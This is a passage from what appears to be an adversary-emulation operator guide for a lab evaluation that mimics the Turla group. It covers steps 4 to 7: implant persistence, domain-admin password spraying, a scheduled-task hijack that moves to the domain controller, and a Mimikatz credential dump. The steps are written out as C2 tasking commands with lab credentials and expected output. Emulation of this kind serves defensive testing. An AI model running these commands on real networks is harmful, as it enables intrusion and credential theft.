<li><p>Open up an administrative Powershell session and run the following commands to remotely restart the service:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">sc.exe \\hobgoblin stop ViperVPNSvc
sc.exe \\hobgoblin start ViperVPNSvc</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> Starting the ViperVPN service should take at least 30 seconds and eventually
result in an error <code v-pre>[SC] StartService FAILED 1053</code>. The EPIC injector will wait
an additional 2 minutes before performing injection. If the <code v-pre>[SC] StartService FAILED 1053</code> error occurs in less than 10 seconds and/or you don&#x27;t receive a
new session, contact your Evals lead.</p>
<ul>
<li>Wait 1 minute and then <span class="docs-emoji">&#x2B55;</span> sign out of your RDP session to <code v-pre>bannik (10.20.10.9)</code> as <code v-pre>Frieda</code></li>
</ul>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Switch to your Kali attack station and confirm that a new elevated implant has registered.</p>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li>EPIC
<ul>
<li>Execute commands <a href="../../../resources/epic/payload/src/epic.cpp#L47-L71">ExecCmd</a></li>
<li>Write results to log file <a href="../../../resources/epic/payload/src/epic.cpp#L311-L345">WriteResults</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://securelist.com/the-epic-turla-operation/65545/">https://securelist.com/the-epic-turla-operation/65545/</a></li>
<li><a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf">https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf</a></li>
</ul>
<br>
<doc-anchor-target id="step-4---persistence">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---persistence">#</doc-anchor-trigger>
        <span>Step 4 - Persistence</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 4 emulates Turla deploying and installing CARBON-DLL as a second stage
malware onto Gunter&#x27;s workstation in order to maintain persistence. CARBON-DLL,
a variant of CARBON relying on DLLs and asymmetric encryption, will inject an auxiliary
communications module DLL into an existing browser process on Gunter&#x27;s workstation
to establish C2 communications via a redirector using HTTP requests. Once this communication
channel is created, the malware will run a few discovery commands on Gunter’s
device.</p>
<p>The CARBON-DLL installer will create the following subdirectories in
<code v-pre>C:\Program Files\Windows NT</code> for tasking-related files and output:</p>
<ul>
<li><code v-pre>C:\Program Files\Windows NT\2028</code></li>
<li><code v-pre>C:\Program Files\Windows NT\0511</code></li>
<li><code v-pre>C:\Program Files\Windows NT\Nlts</code></li>
</ul>
<p>The CARBON-DLL installer will drop the following files to disk:</p>
<ul>
<li>CAST-128 encrypted configuration file to
<code v-pre>%programfiles%\Windows NT\setuplst.xml</code></li>
<li>Loader DLL to <code v-pre>%systemroot%\System32\mressvc.dll</code></li>
<li>Orchestrator DLL to <code v-pre>%programfiles%\Windows NT\MSSVCCFG.dll</code></li>
<li>Communications library DLL to <code v-pre>%programfiles%\Windows NT\msxhlp.dll</code></li>
</ul>
<p>After successful file writes, the CARBON-DLL installer will create the <code v-pre>WinSys Restore Service</code>
service, written as <code v-pre>WinResSvc</code>, to execute the loader DLL.</p>
<p>The CARBON-DLL installer then performs two registry writes to make sure that
the service can find the loader DLL and that the service will run under
<code v-pre>svchost</code>:</p>
<ol>
<li>The loader DLL path is written to registry key
<code v-pre>HKLM:\SYSTEM\CurrentControlSet\services\WinResSvc\Parameters</code> under the
<code v-pre>ServiceDll</code> value</li>
<li>The service is written to registry key
<code v-pre>HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code> under the
<code v-pre>WinSysRestoreGroup</code> value</li>
</ol>
<p>Once the service is set up, the CARBON-DLL installer will start the service
before terminating its own execution.</p>
<p>On service execution, the loader DLL <code v-pre>mressvc.dll</code> will run under <code v-pre>svchost</code> and
execute the orchestrator DLL <code v-pre>MSSVCCFG.dll</code>. The orchestrator DLL will then
inject the communications library DLL <code v-pre>msxhlp.dll</code> into processes typically
using HTTP, such as Internet Explorer. Several configuration, logging, and
tasking files are dropped in <code v-pre>C:\Program Files\Windows NT</code>.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to your RDP session to <code v-pre>hobgoblin (10.20.20.102)</code> as <code v-pre>Gunter</code></p>
<ul>
<li><p>Ensure you have a Microsoft Edge window open with OWA. If not:</p>
<ul>
<li>Open up Microsoft Edge and browse to <code v-pre>https://brieftragerin.skt.local/owa</code>. Login:</li>
</ul>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Gunter</td>
<td style="text-align: center;">Password1!</td>
</tr>
</tbody>
</table>
</div>
</li>
</ul>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe'</code></pre>
</doc-codeblock></div>
<ul>
<li>Once the download has completed successfully, wait 1 minute and then task the EPIC implant to execute the CARBON-DLL installer:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe'</code></pre>
</doc-codeblock></div>
<ul>
<li><p>CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered  with the C2 server</p>
<ul>
<li><span class="docs-emoji">&#x1F4F7;</span> - upload a screenshot of the new implant session.</li>
</ul>
</li>
<li><p>Wait 1 minute and then task the Carbon implant to execute some discovery commands:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515 '{&quot;id&quot;: 0, &quot;cmd&quot;: &quot;whoami&quot;}'</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/carbon/carboninstaller/">CARBON-DLL installer</a>
<ul>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/file_handler.cpp#L178">Drop components</a></li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L170">Create Loader Service</a>
<ul>
<li>Service registry edits: <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L230">1</a>, <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L284">2</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L354">Start Loader Service</a></li>
<li><a href="../../../resources/carbon/carboninstaller/loader/src/service.cpp">Loader Service</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/injection.cpp#L454">Comms Lib DLL Injection</a></li>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
</ul>
</li>
<li>EPIC
<ul>
<li>File download <a href="../../../resources/epic/payload/src/epic.cpp#L441-L466">DownloadFile</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/">https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/</a></li>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html">https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html</a></li>
<li><a href="https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra">https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra</a></li>
</ul>
<br>
<doc-anchor-target id="step-5---lateral-movement-to-domain-controller">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---lateral-movement-to-domain-controller">#</doc-anchor-trigger>
        <span>Step 5 - Lateral Movement to Domain Controller</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 5 emulates Turla laterally moving to the domain controller by conducting
password spraying to retrieve a domain admin&#x27;s credentials to the domain
controller and using a scheduled task to gain execution on the domain
controller.</p>
<p>CARBON-DLL downloads a batch script which uses sprays several of the discovered
domain admin accounts with weak passwords, one of which successfully mounts the
<code v-pre>C:\</code> drive of the domain controller.</p>
<p>In preparation for lateral movement, CARBON-DLL downloads a second copy of
its installer and moves it to the <code v-pre>System32</code> directory of the domain controller.
Then, the <code v-pre>Customer Experience Improvement Program</code>&#x27;s <code v-pre>Consolidator</code> scheduled
task is modified to execute the CARBON-DLL installer.</p>
<p>Lastly, CARBON-DLL sends a request to run the modified scheduled task,
achieving lateral movement to and execution on the domain controller.</p>
<p>By this point, Frieda has logged into the domain controller to start a browser
process as part of legitimate user activity, which the new CARBON-DLL implant
injects into to begin kicking off its communication with the C2 server.</p>
<p>Rather than communicate directly to the C2 redirector over HTTP, the new CARBON-DLL
implant uses peer-to-peer communication over named pipes through the first
CARBON-DLL implant on <code v-pre>hobgoblin (10.20.20.102)</code>. Discovery commands are then executed,
leading to the identification of an Apache web server and the workstation for
the administrator of the Apache server, <code v-pre>Adalwolfa</code>.</p>
<p>Peer-to-peer communication will occur over the <code v-pre>dsnap</code> named pipe on both participating hosts.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to your RDP session to <code v-pre>hobgoblin (10.20.20.102)</code> as
<code v-pre>Gunter</code>. Minimize (do not close) the <code v-pre>hobgoblin (10.20.20.102)</code> RDP window.</p>
<ul>
<li>Start a new RDP session to <code v-pre>bannik (10.20.10.9)</code> as <code v-pre>Frieda</code>:</li>
</ul>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Frieda</td>
<td style="text-align: center;">Password3!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>Close any spurious windows</p>
</li>
<li><p>Open up Microsoft Edge (search for <code v-pre>Edge</code> if not in toolbar, <strong>do not use Edge Beta</strong>), decline all first-run start up options, and browse to <code v-pre>https://brieftragerin.skt.local/owa</code></p>
</li>
</ul>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Wait 1 minute and return to your Kali control server terminal</p>
<ul>
<li>Task CARBON-DLL to download and execute the batch script to spray weak
passwords against the domain admin accounts and attempt to mount the <code v-pre>C$</code> drive of the DC.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515  '{&quot;id&quot;: 1, &quot;payload&quot;: &quot;password_spray.bat&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\winsas64.bat&quot;, &quot;cmd&quot;: &quot;C:\\Windows\\Temp\\winsas64.bat&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that the script successfully sprays <code v-pre>Frieda</code>&#x27;s password by checking the task output.
You should see task output which states the following. It should take approximately 5 minutes to complete:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">The command completed successfully.

frieda:Password3! SUCCESS</code></pre>
</doc-codeblock></div>
</blockquote>
</li>
<li><p>Wait 1 minute and then task CARBON-DLL to remove the password spray script.</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515  '{&quot;id&quot;: 2, &quot;cmd&quot;: &quot;del /Q C:\\Windows\\Temp\\winsas64.bat&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the <code v-pre>System32</code> folder
on the DC via the mounted drive.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515 '{&quot;id&quot;: 3, &quot;payload&quot;: &quot;carbon_installer_2.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\wmimetricsq.exe&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\wmimetricsq.exe \\\\bannik\\C$\\Windows\\System32&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task CARBON-DLL to enumerate remote scheduled tasks on
the domain controller, using the discovered password for the domain admin
<code v-pre>Frieda</code></li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515 '{&quot;id&quot;: 4, &quot;cmd&quot;: &quot;schtasks /query /S bannik /U skt\\Frieda /P Password3!&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that the <code v-pre>Consolidator</code> task under the <code v-pre>\Microsoft\Windows\Customer Experience Improvement Program\</code> task folder appears in the output.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">grep 'Folder: \\Microsoft\\Windows\\Customer Experience Improvement Program' logs.txt -A 5 -i</code></pre>
</doc-codeblock></div>
<ul>
<li>This should return:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Folder: \Microsoft\Windows\Customer Experience Improvement Program
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Consolidator                             2/24/2023 12:00:00 AM  Ready          
UsbCeip                                  N/A                    Ready      </code></pre>
</doc-codeblock></div>
</blockquote>
</li>
<li><p>Wait 1 minute and then task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain
admin <code v-pre>Frieda</code> (<a href="https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a">https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a</a>).</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515 '{&quot;id&quot;: 5, &quot;cmd&quot;: &quot;schtasks /Change /S bannik /U skt\\Frieda /P Password3! /TN \&quot;\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\&quot; /TR %SystemRoot%\\System32\\wmimetricsq.exe&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task CARBON-DLL to remotely start the modified scheduled task on the domain controller.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 9b5ef515 '{&quot;id&quot;: 6, &quot;cmd&quot;: &quot;schtasks /Run /S bannik /U skt\\Frieda /P Password3! /TN \&quot;\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\&quot; /I&quot;}'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to your control server output and confirm the registration of a new
CARBON-DLL implant on the domain controller.</p>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to your tasking window and task the new CARBON-DLL implant
with discovery commands to be run on the domain controller.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 0, &quot;cmd&quot;: &quot;net group /domain&quot;}'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x2757;</span> Verify that the <code v-pre>Web Servers</code> and <code v-pre>Web Server Admins</code> groups are in the output.</p>
<ul>
<li>Wait 1 minute and then task CARBON-DLL to enumerate both groups for their members.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 1, &quot;cmd&quot;: &quot;net group \&quot;Web Servers\&quot; /domain &amp;&amp; net group \&quot;Web Server Admins\&quot; /domain&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task CARBON-DLL to enumerate the Active Directory
Computers.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 2, &quot;cmd&quot;: &quot;dsquery * -filter \&quot;(&amp;(objectclass=computer))\&quot; -attr *&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Ensure <code v-pre>khabibulin</code> is in the output and confirm the <code v-pre>Description</code> value is
&quot;Adalwolfa Workstation&quot;.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">grep 'cn: khabibulin' logs.txt -C 2 -i</code></pre>
</doc-codeblock></div>
<ul>
<li>This should return:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">objectClass: user
objectClass: computer
cn: khabibulin
description: Adalwolfa Workstation
distinguishedName: CN=khabibulin,CN=Computers,DC=skt,DC=local</code></pre>
</doc-codeblock></div>
</blockquote>
</li>
</ul>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../resources/payloads/carbon/password_spray.bat">Password spray batch script</a></li>
<li><a href="../../../resources/carbon/carboninstaller/">CARBON-DLL installer</a>
<ul>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/file_handler.cpp#L178">Drop components</a></li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L170">Create Loader Service</a>
<ul>
<li>Service registry edits: <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L230">1</a>, <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L284">2</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L354">Start Loader Service</a></li>
<li><a href="../../../resources/carbon/carboninstaller/loader/src/service.cpp">Loader Service</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/injection.cpp#L454">Comms Lib DLL Injection</a></li>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task/payload retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/namedpipep2p.cpp">Peer to peer communications over named pipes</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://securelist.com/the-epic-turla-operation/65545/">https://securelist.com/the-epic-turla-operation/65545/</a></li>
<li><a href="https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a">https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a</a></li>
<li><a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/">https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/</a></li>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html">https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html</a></li>
<li><a href="https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra">https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra</a></li>
</ul>
<br>
<doc-anchor-target id="step-6---preparation-for-lateral-movement-onto-second-host">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---preparation-for-lateral-movement-onto-second-host">#</doc-anchor-trigger>
        <span>Step 6 - Preparation for Lateral Movement onto Second Host</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 6 emulates Turla downloading and executing Mimikatz as <code v-pre>terabox.exe</code>
after gaining persistance on the machine. Execution of Mimikatz will reveal a
cached NTLM hash for the admin user <code v-pre>Adalwolfa</code>. This username/hash combination
will be used in the next step for lateral movement.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li>From your Kali C2 terminal, task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump (note that the file gets downloaded to <code v-pre>C:\Windows\\Temp\</code> and then gets moved to <code v-pre>C:\Windows\System32</code> after download since the CARBON-DLL communications library module cannot download directly to privileged locations):</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 3, &quot;payload&quot;: &quot;mimikatz.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\terabox.exe&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe &amp;&amp; C:\\Windows\\System32\\terabox.exe \&quot;lsdu::go /ynot\&quot; \&quot;quit\&quot;&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that the NTLM hash for <code v-pre>adalwolfa</code> is included in the output.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">grep 'NTLM : 07d128430a6338f8d537f6b3ae1dc136' logs.txt -C 5 -i</code></pre>
</doc-codeblock></div>
<ul>
<li>This should return:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">RID  : 00000456 (1110)
User : Adalwolfa

* Primary
    NTLM : 07d128430a6338f8d537f6b3ae1dc136
    LM   : 
Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
    ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
    lm  - 0: 95b8536c32208871930216e62d5e12d4</code></pre>
</doc-codeblock></div>
</blockquote>
</li>
</ul>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task/payload retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/namedpipep2p.cpp">Peer to peer communications over named pipes</a></li>
</ul>
</li>
<li><a href="../../../resources/mimikatz/">Mimikatz</a></li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html" class="outbound" target="_blank"><span>Report 4: SwissCERT - RUAG Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments" class="outbound" target="_blank"><span>Report 9: Symantec - Waterbug New Toolset</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/">https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/</a></li>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html">https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html</a></li>
<li><a href="https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra">https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra</a></li>
</ul>
<br>
<doc-anchor-target id="step-7---lateral-movement-to-second-workstation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---lateral-movement-to-second-workstation">#</doc-anchor-trigger>
        <span>Step 7 - Lateral Movement to Second Workstation</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 7 emulates Turla preparing for and performing lateral movement to a second
workstation in the domain, the Windows workstation belonging to Adalwolfa.</p>
<p>Adalwolfa logs into their workstation <code v-pre>khabibulin (10.20.20.104)</code> and opens up
Edge to prepare for their legitimate user activity.</p>
<p>In the meantime, the CARBON-DLL implant on the domain controller downloads
PsExec and a third copy of the CARBON-DLL installer, downloading both initially
